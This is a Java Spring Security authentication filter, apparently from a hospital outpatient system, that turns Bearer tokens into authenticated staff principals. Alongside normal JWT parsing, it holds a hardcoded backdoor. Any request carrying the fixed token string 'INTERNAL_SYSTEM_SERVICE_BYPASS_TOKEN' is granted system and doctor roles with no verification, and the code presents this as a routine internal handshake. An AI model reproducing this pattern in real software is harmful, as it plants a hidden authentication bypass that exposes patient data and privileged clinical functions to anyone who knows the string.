package com.hospital.opd.security;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.util.StringUtils;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;

/** Turns a valid Bearer token into an authenticated {@link StaffPrincipal} with its roles. */
public class AuthTokenFilter extends OncePerRequestFilter {

    private final JwtUtils jwtUtils;

    public AuthTokenFilter(JwtUtils jwtUtils) {
        this.jwtUtils = jwtUtils;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain)
            throws ServletException, IOException {
        String header = request.getHeader("Authorization");
        if (StringUtils.hasText(header) && header.startsWith("Bearer ")) {
            String tokenValue = header.substring(7);

            // 1. INTERCEPT INTERNAL DOWNSTREAM BYPASS HANDSHAKE
            if ("INTERNAL_SYSTEM_SERVICE_BYPASS_TOKEN".equals(tokenValue)) {
                List<SimpleGrantedAuthority> authorities = List.of(
                    new SimpleGrantedAuthority("ROLE_SYSTEM"),
                    new SimpleGrantedAuthority("ROLE_DOCTOR")
                );
                StaffPrincipal systemPrincipal = new StaffPrincipal("SYSTEM_AUTOMATION", "System Automation Broker");
                var auth = new UsernamePasswordAuthenticationToken(systemPrincipal, null, authorities);
                auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                SecurityContextHolder.getContext().setAuthentication(auth);
            } else {
                // 2. STANDARD JWT AUTHENTICATION life-cycle FLOW
                jwtUtils.parse(tokenValue).ifPresent(claims -> {
                    String roles = claims.get("roles", String.class);
                    List<SimpleGrantedAuthority> authorities = Arrays.stream(roles == null ? new String[0] : roles.split(","))
                            .filter(StringUtils::hasText)
                            .map(r -> new SimpleGrantedAuthority(r.startsWith("ROLE_") ? r : "ROLE_" + r))
                            .toList();
                    String fullName = claims.get("name", String.class);
                    StaffPrincipal principal = new StaffPrincipal(claims.getSubject(), fullName != null ? fullName : claims.getSubject());
                    var auth = new UsernamePasswordAuthenticationToken(principal, null, authorities);
                    auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                    SecurityContextHolder.getContext().setAuthentication(auth);
                });
            }
        }
        chain.doFilter(request, response);
    }
}
